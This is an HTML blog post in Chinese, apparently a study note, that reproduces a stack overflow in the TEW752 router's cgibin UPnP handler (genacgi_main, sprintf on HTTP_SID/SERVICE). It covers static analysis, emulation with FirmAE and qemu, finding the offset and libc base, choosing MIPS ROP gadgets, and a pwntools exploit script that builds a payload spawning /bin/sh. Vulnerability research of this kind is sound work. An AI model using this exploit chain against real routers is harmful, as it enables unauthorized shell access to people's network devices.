@@ -1,0 +1,230 @@
+<!doctype html>
+<html lang="zh">
+  <head>
+    <title>【栈溢出】TEW752漏洞复现 // 江南酒与燕赵歌</title>
+    <link rel="shortcut icon" href="images/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.128.2">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="【栈溢出】TEW752漏洞复现">
+  <meta name="twitter:description" content="前期准备 固件下载链接：TEW752
+静态分析 根据漏洞通报里的描述，漏洞存在于cgibin程序的genacgi_main函数，把cgibin放到IDA里分析
+函数比较简单，可能存在漏洞的点只能是在两个if的分支判断里，在request_method为UNSUBSCRIBE时，可以看到sprintf这个危险函数是没有进行长度检查的，并且v2(HTTP_SID)以及a1(SERVICE)都是可控的，可以注入恶意数据利用漏洞。
+但是，在路由器的文件系统中却并没有gena.cgi文件，所以不能通过qemu用户模式模拟来复现
+同时，在文件系统中搜索gena.cgi，除了cgibin程序就是几个web层面的php文件
+分析几个php文件，defnodes文件夹下的几个php文件只是设置事件订阅的URL，在httpsvcs.php文件中可以看到gena.cgi和UPNP服务有关：
+并且upnpsetup函数会在接收请求后创建gena.cgi等文件，upnpsetup函数中还可以看到，可以通过49152端口向UPNP发送数据：
+考虑构造一个特定的HTTP UNSUBSCRIBE请求，其中包含足够长的数据，使得 sprintf 函数写入超过 v5 （512）缓冲区的范围，从而触发栈溢出。
+模拟路由器环境
+构造HTTP请求（溢出HTTP_SID/SERVICE）
+TCP scoket来发送请求
+路由器模拟 使用FirmAE工具进行路由器固件的模拟。注意：FirmAE的安装需要走代理——Ubuntu里开代理或者主机Windows开全局代理模式，并且初次模拟固件时间较长，可能会误以为模拟失败。
+动态调试 1 测偏移 先用cyclic 2000 &gt; test生成测试字符到test文件，再用如下脚本启动qemu用户模式
+#!/bin/bash service=&#34;?service=`cat test`&#34; qemu-mipsel-static -L ./ -g 1234 -0 &#34;gena.cgi&#34; -E REQUEST_METHOD=&#34;UNSUBSCRIBE&#34; -E REQUEST_URI=$service -E HTTP_SID=1 -E SERVER_ID=LAN-3 -E REMOTE_ADDR=&#34;192.168.182.14&#34; ./htdocs/cgibin 使用gdb连接上之后，直接c，让其溢出，然后可以测得偏移为474
+2 找基址 由于使用vmmap命令无法得到libc的基址
+所以，这里仍然根据延迟绑定机制来计算libc的基址
+0x3ff8a060 - 0x52060 = 0x3ff38000
+所以vmmap查看得到的，&lt; explored &gt;文件就是libc的基址
+3 找gadget 考虑利用system函数来得到shell
+mipsrop.stackfinder() 选择0x16824处的gadget
+$sp &#43; 0x10传给$s5，在0x16838处又赋值给$a0，$a0作为函数传参的寄存器，要存放cmd">
+
+    <meta property="og:url" content="https://zhu1ang.github.io/post/tew752/">
+  <meta property="og:site_name" content="江南酒与燕赵歌">
+  <meta property="og:title" content="【栈溢出】TEW752漏洞复现">
+  <meta property="og:description" content="前期准备 固件下载链接：TEW752
+静态分析 根据漏洞通报里的描述，漏洞存在于cgibin程序的genacgi_main函数，把cgibin放到IDA里分析
+函数比较简单，可能存在漏洞的点只能是在两个if的分支判断里，在request_method为UNSUBSCRIBE时，可以看到sprintf这个危险函数是没有进行长度检查的，并且v2(HTTP_SID)以及a1(SERVICE)都是可控的，可以注入恶意数据利用漏洞。
+但是，在路由器的文件系统中却并没有gena.cgi文件，所以不能通过qemu用户模式模拟来复现
+同时，在文件系统中搜索gena.cgi，除了cgibin程序就是几个web层面的php文件
+分析几个php文件，defnodes文件夹下的几个php文件只是设置事件订阅的URL，在httpsvcs.php文件中可以看到gena.cgi和UPNP服务有关：
+并且upnpsetup函数会在接收请求后创建gena.cgi等文件，upnpsetup函数中还可以看到，可以通过49152端口向UPNP发送数据：
+考虑构造一个特定的HTTP UNSUBSCRIBE请求，其中包含足够长的数据，使得 sprintf 函数写入超过 v5 （512）缓冲区的范围，从而触发栈溢出。
+模拟路由器环境
+构造HTTP请求（溢出HTTP_SID/SERVICE）
+TCP scoket来发送请求
+路由器模拟 使用FirmAE工具进行路由器固件的模拟。注意：FirmAE的安装需要走代理——Ubuntu里开代理或者主机Windows开全局代理模式，并且初次模拟固件时间较长，可能会误以为模拟失败。
+动态调试 1 测偏移 先用cyclic 2000 &gt; test生成测试字符到test文件，再用如下脚本启动qemu用户模式
+#!/bin/bash service=&#34;?service=`cat test`&#34; qemu-mipsel-static -L ./ -g 1234 -0 &#34;gena.cgi&#34; -E REQUEST_METHOD=&#34;UNSUBSCRIBE&#34; -E REQUEST_URI=$service -E HTTP_SID=1 -E SERVER_ID=LAN-3 -E REMOTE_ADDR=&#34;192.168.182.14&#34; ./htdocs/cgibin 使用gdb连接上之后，直接c，让其溢出，然后可以测得偏移为474
+2 找基址 由于使用vmmap命令无法得到libc的基址
+所以，这里仍然根据延迟绑定机制来计算libc的基址
+0x3ff8a060 - 0x52060 = 0x3ff38000
+所以vmmap查看得到的，&lt; explored &gt;文件就是libc的基址
+3 找gadget 考虑利用system函数来得到shell
+mipsrop.stackfinder() 选择0x16824处的gadget
+$sp &#43; 0x10传给$s5，在0x16838处又赋值给$a0，$a0作为函数传参的寄存器，要存放cmd">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2024-07-19T15:47:43+08:00">
+    <meta property="article:modified_time" content="2024-07-19T15:47:43+08:00">
+    <meta property="article:tag" content="学习笔记">
+    <meta property="article:tag" content="Iot">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://zhu1ang.github.io/"><img class="app-header-avatar" src="/images/ico.jpg" alt="John Doe" /></a>
+      <span class="app-header-title">江南酒与燕赵歌</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>网安核动力驴.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/zhu1ang" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">【栈溢出】TEW752漏洞复现</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 19, 2024
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          1 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://zhu1ang.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+              <a class="tag" href="https://zhu1ang.github.io/tags/iot/">Iot</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h3 id="前期准备">前期准备</h3>
+<p>固件下载链接：<a href="https://github.com/zhu1ang/Image/tree/main/">TEW752</a></p>
+<h3 id="静态分析">静态分析</h3>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251438961.png?x-oss-process=style/zzz" alt="image-20240725143817879"></p>
+<p>根据漏洞通报里的描述，漏洞存在于cgibin程序的<code>genacgi_main</code>函数，把cgibin放到IDA里分析</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251441663.png?x-oss-process=style/zzz" alt="image-20240725144110633"></p>
+<p>函数比较简单，可能存在漏洞的点只能是在两个if的分支判断里，在request_method为UNSUBSCRIBE时，可以看到sprintf这个危险函数是没有进行长度检查的，并且v2(HTTP_SID)以及a1(SERVICE)都是可控的，可以注入恶意数据利用漏洞。</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251447308.png?x-oss-process=style/zzz" alt="image-20240725144745270"></p>
+<p>但是，在路由器的文件系统中却并没有gena.cgi文件，所以不能通过qemu用户模式模拟来复现</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251456363.png?x-oss-process=style/zzz" alt="image-20240725145649333"></p>
+<p>同时，在文件系统中搜索gena.cgi，除了cgibin程序就是几个web层面的php文件</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251458010.png?x-oss-process=style/zzz" alt="image-20240725145851983"></p>
+<p>分析几个php文件，defnodes文件夹下的几个php文件只是设置事件订阅的URL，在httpsvcs.php文件中可以看到gena.cgi和UPNP服务有关：</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251628979.png?x-oss-process=style/zzz" alt="image-20240725162830870"></p>
+<p>并且<code>upnpsetup</code>函数会在接收请求后创建gena.cgi等文件，<code>upnpsetup</code>函数中还可以看到，可以通过49152端口向UPNP发送数据：</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251630096.png?x-oss-process=style/zzz" alt="image-20240725163023059"></p>
+<p>考虑构造一个特定的<strong>HTTP UNSUBSCRIBE</strong>请求，其中包含足够长的数据，使得 <code>sprintf</code> 函数写入超过 <code>v5</code> （512）缓冲区的范围，从而触发栈溢出。</p>
+<ul>
+<li>
+<p>模拟路由器环境</p>
+</li>
+<li>
+<p>构造HTTP请求（溢出HTTP_SID/SERVICE）</p>
+</li>
+<li>
+<p>TCP scoket来发送请求</p>
+</li>
+</ul>
+<h3 id="路由器模拟">路由器模拟</h3>
+<p>使用FirmAE工具进行路由器固件的模拟。注意：FirmAE的安装需要走代理——Ubuntu里开代理或者主机Windows开全局代理模式，并且初次模拟固件时间较长，可能会误以为模拟失败。</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251705344.png?x-oss-process=style/zzz" alt="image-20240725170532197"></p>
+<h3 id="动态调试">动态调试</h3>
+<h4 id="1-测偏移">1 测偏移</h4>
+<p>先用<code>cyclic 2000 &gt; test</code>生成测试字符到test文件，再用如下脚本启动qemu用户模式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>service<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?service=`cat test`&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>qemu-mipsel-static -L ./ -g <span style="color:#ae81ff">1234</span> -0 <span style="color:#e6db74">&#34;gena.cgi&#34;</span> -E REQUEST_METHOD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UNSUBSCRIBE&#34;</span> -E REQUEST_URI<span style="color:#f92672">=</span>$service -E HTTP_SID<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -E SERVER_ID<span style="color:#f92672">=</span>LAN-3 -E REMOTE_ADDR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.182.14&#34;</span> ./htdocs/cgibin
+</span></span></code></pre></div><p>使用gdb连接上之后，直接c，让其溢出，然后可以测得偏移为474</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121400707.png?x-oss-process=style/zzz" alt="image-20240812140012766"></p>
+<h4 id="2-找基址">2 找基址</h4>
+<p>由于使用vmmap命令无法得到libc的基址</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121404929.png?x-oss-process=style/zzz" alt="image-20240812140413886"></p>
+<p>所以，这里仍然根据延迟绑定机制来计算libc的基址</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121522021.png?x-oss-process=style/zzz" alt="image-20240812152213978"></p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121523991.png?x-oss-process=style/zzz" alt="image-20240812152312960"></p>
+<p>0x3ff8a060 - 0x52060 = 0x3ff38000</p>
+<p>所以vmmap查看得到的，&lt; explored &gt;文件就是libc的基址</p>
+<h4 id="3-找gadget">3 找gadget</h4>
+<p>考虑利用system函数来得到shell</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121528692.png?x-oss-process=style/zzz" alt="image-20230802193139879"></p>
+<pre tabindex="0"><code>mipsrop.stackfinder()
+</code></pre><p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121528690.png?x-oss-process=style/zzz" alt="image-20230802192201543"></p>
+<p>选择0x16824处的gadget</p>
+<p><code>$sp + 0x10</code>传给$s5，在0x16838处又赋值给$a0，$a0作为函数传参的寄存器，要存放<code>cmd</code></p>
+<p>跳转$s0。</p>
+<p>仍然需要防止坏字符00，所以找对$s0操作的gadget</p>
+<p>观察溢出函数处</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121528693.png?x-oss-process=style/zzz" alt="image-20230802194856043"></p>
+<pre tabindex="0"><code>mipsrop.find(&#34;addiu $s0&#34;)
+</code></pre><!-- raw HTML omitted -->
+<p>$s1放上一个gadget</p>
+<p>$0 放system地址</p>
+<p>$ra 返回地址放第二个gadget</p>
+<h3 id="本地利用">本地利用</h3>
+<p>根据测得的偏移和找到的基址以及gadget，编写exp如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;little&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mips&#34;</span>
+</span></span><span style="display:flex;"><span>base_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3ff38000</span>
+</span></span><span style="display:flex;"><span>system_addr_1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x53200</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>gadget1 <span style="color:#f92672">=</span>  <span style="color:#ae81ff">0x16824</span>
+</span></span><span style="display:flex;"><span>gadget2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x32a98</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1ce</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">+=</span> p32(base_addr <span style="color:#f92672">+</span> system_addr_1) <span style="color:#75715e"># s0</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">+=</span> p32(base_addr <span style="color:#f92672">+</span> gadget1 )      <span style="color:#75715e"># s1</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>                           <span style="color:#75715e"># s2</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">+=</span> p32(base_addr <span style="color:#f92672">+</span> gadget2)       <span style="color:#75715e"># ra</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin//sh&#39;</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;exploit&#34;</span>,<span style="color:#e6db74">&#39;wb+&#39;</span>)
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">.</span>write(padding)
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>用start.sh脚本启动模拟，gdb连接上之后不用下断点，直接c，成功得到shell</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121518900.png?x-oss-process=style/zzz" alt="image-20240812151811845"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
